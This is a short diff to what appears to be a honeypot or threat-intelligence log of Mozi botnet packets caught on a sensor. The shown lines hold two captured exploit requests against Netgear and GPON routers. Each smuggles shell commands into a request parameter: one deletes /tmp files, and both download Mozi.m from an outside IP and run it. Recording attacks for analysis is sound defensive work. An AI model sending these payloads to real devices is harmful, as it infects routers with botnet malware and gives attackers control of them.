@@ -38,7 +38,7 @@ Mozi's malicious packets found on the sensor. Some are different as the adversar
   GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.105.70.109:44703/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
 
 
-
+2021-10-23 16:05:35 from 120.85.114.82
   POST /GponForm/diag_Form?images/ HTTP/1.1
   Host: 127.0.0.1:80
   Connection: keep-alive
@@ -47,5 +47,4 @@ Mozi's malicious packets found on the sensor. Some are different as the adversar
   User-Agent: Hello, World
   Content-Length: 118
 
-2021-10-23 16:05:35 from 120.85.114.82
   XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+
